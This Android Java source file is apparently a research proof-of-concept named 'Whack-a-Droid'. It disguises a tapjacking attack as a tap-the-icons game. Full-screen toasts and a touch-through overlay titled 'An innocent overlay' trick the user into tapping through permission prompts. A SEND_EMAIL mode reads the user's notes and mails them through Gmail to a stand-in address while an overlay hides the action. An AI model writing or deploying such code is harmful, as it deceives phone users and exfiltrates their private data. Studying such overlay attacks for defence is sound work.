package com.tum.whackadroid.Service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.tum.whackadroid.Activity.MainActivity;
import com.tum.whackadroid.Helper.RetrieveCatchNotes;
import com.tum.whackadroid.R;

import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

public class GameService extends Service {

    public static final String START_GAME = "com.tum.whackadroid.gameservice.START";
    public static final String STOP_GAME = "com.tum.whackadroid.gameservice.STOP";
    public static final String GAIN_ACCESS = "com.tum.whackadroid.gameservice.GAIN_ACCESS";
    public static final String SEND_EMAIL = "com.tum.whackadroid.gameservice.SEND_EMAIL";
    private static String MODE = "com.tum.whackadroid.gameservice.START";
    private Toast gameToast;
    private WindowManager windowManager;
    private Timer gameTimer;
    private Context appContext;
    private View mOverlay;
    final String email = "anyemail@gmail.com";

    public GameService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        // Set the scene for the game
        appContext = getApplicationContext();
        gameTimer = new Timer(); // Used to make sure the toast is continuously visible
        gameToast = new Toast(appContext);
        // Build the scene based on the current mode
        Log.d(MainActivity.WHACK_A_DROID, "MODE is '" + MODE + "'");
        buildScene(MODE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start the game service
        MODE = intent.getAction().toString();
        Log.d(MainActivity.WHACK_A_DROID, "Found intent action: " + MODE);
        // Make sure Toast fills the screen
        gameToast.setGravity(Gravity.FILL, 0, 0);
        gameTimer.scheduleAtFixedRate(displayToast(), 0, 500);

        // Added buildScene here...
        buildScene(MODE);
        return START_REDELIVER_INTENT;
    }

    private TimerTask displayToast() {
        return new TimerTask() {
            @Override
            public void run() {
                if (MODE.equals(START_GAME)) {
                    Log.d(MainActivity.WHACK_A_DROID, "Showing new toast");
                    gameToast.show();
                }
            }
        };
    }

    private void buildScene(final String mode) {

        if (mode.equals(START_GAME)) {
            // Remove overlay if it is there
            hideOverlay();
            // Builds the scene to be displayed by the Toast
            View gameBackground = new View(appContext);
            gameBackground.setBackgroundColor(Color.BLACK);
            gameBackground.setAlpha(0.5f); // TODO: Change that to manipulate the background's opacity
            // Display Android icons in random positions
            RelativeLayout gameScene = new RelativeLayout(appContext);
            gameScene.addView(gameBackground);
            Random position = new Random();
            for (int i = 0; i < 5; i++) {
                int x = position.nextInt(1080);
                int y = position.nextInt(1092);
                // Retrieve the images for the game
                final ImageView droidImage = new ImageView(appContext);
                droidImage.setImageResource(R.drawable.android);
                droidImage.setId(i);
                droidImage.setClickable(true);
                RelativeLayout.LayoutParams imageParams = new RelativeLayout.LayoutParams(128, 128);
                imageParams.leftMargin = x;
                imageParams.topMargin = y;
                // Add a "Caption" for order of clicking
                RelativeLayout.LayoutParams captionParams = new RelativeLayout.LayoutParams(64, 64);
                captionParams.leftMargin = x + 50;
                captionParams.topMargin = y + 40;
                Log.d(MainActivity.WHACK_A_DROID, "Image X: " + x + ", Image Y: " + y);
                // Add views to the layout
                TextView caption = new TextView(appContext);
                caption.setTextColor(Color.BLACK);
                caption.setTypeface(null, Typeface.BOLD);
                caption.setText(Integer.toString(i + 1));
                // Add image and caption to view
                gameScene.addView(droidImage, imageParams);
                gameScene.addView(caption, captionParams);
            }
            // Set the scene
            gameToast.setView(gameScene);

        } else if (mode.equals(GAIN_ACCESS)) {
            hideOverlay();
            Log.d(MainActivity.WHACK_A_DROID, "Trying to get all permissions...");
            windowManager = (WindowManager) getApplicationContext().getSystemService(WINDOW_SERVICE);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.TYPE_TOAST,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED
            );
            layoutParams.format = PixelFormat.TRANSLUCENT;
            layoutParams.setTitle("An innocent overlay");
            layoutParams.width = ViewGroup.LayoutParams.MATCH_PARENT;
            layoutParams.height = ViewGroup.LayoutParams.WRAP_CONTENT;
            layoutParams.x = 0;
            layoutParams.y = -180;
            layoutParams.gravity = Gravity.CENTER;
            layoutParams.windowAnimations = 0;

            mOverlay = View.inflate(getApplicationContext(), R.layout.overlay, null);
            windowManager.addView(mOverlay, layoutParams);

        } else if (mode.equals(SEND_EMAIL)) {
            hideOverlay();
            sendEmail();
            WindowManager windowManager = (WindowManager) getApplicationContext().getSystemService(WINDOW_SERVICE);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.TYPE_TOAST,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            );
            mOverlay = View.inflate(getApplicationContext(), R.layout.email_overlay, null);
            windowManager.addView(mOverlay, layoutParams);

        } else if (STOP_GAME.equals(MODE)) {
            hideOverlay();
        }
    }

    private void hideOverlay() {
        if (mOverlay != null) {
            Log.d(MainActivity.WHACK_A_DROID, "Removing overlay...");
            WindowManager windowManager = (WindowManager) getApplicationContext().getSystemService(WINDOW_SERVICE);
            windowManager.removeView(mOverlay);
            mOverlay = null;
        }
    }

    private void sendEmail() {
        final String content = RetrieveCatchNotes.acquireInformation(this);
        Log.d(MainActivity.WHACK_A_DROID, "Sending information '" + content + "'");
        final Intent emailIntent = new Intent(Intent.ACTION_SEND);
        emailIntent.putExtra(Intent.EXTRA_SUBJECT, "notes");
        emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{email});
        emailIntent.setType("text/plain");
        emailIntent.putExtra(android.content.Intent.EXTRA_TEXT, content);
        final PackageManager pm = this.getPackageManager();
        final List<ResolveInfo> matches = pm.queryIntentActivities(emailIntent, 0);
        ResolveInfo best = null;
        for (final ResolveInfo info : matches)
            if (info.activityInfo.packageName.endsWith(".gm") || info.activityInfo.name.toLowerCase().contains("gmail"))
                best = info;
        if (best != null)
            emailIntent.setClassName(best.activityInfo.packageName, best.activityInfo.name);
        emailIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        this.startActivity(emailIntent);
    }

    @Override
    public void onDestroy() {
        gameTimer.cancel();
        gameToast.cancel();
        Log.d(MainActivity.WHACK_A_DROID, "Destroying service");
        super.onDestroy();
    }
}
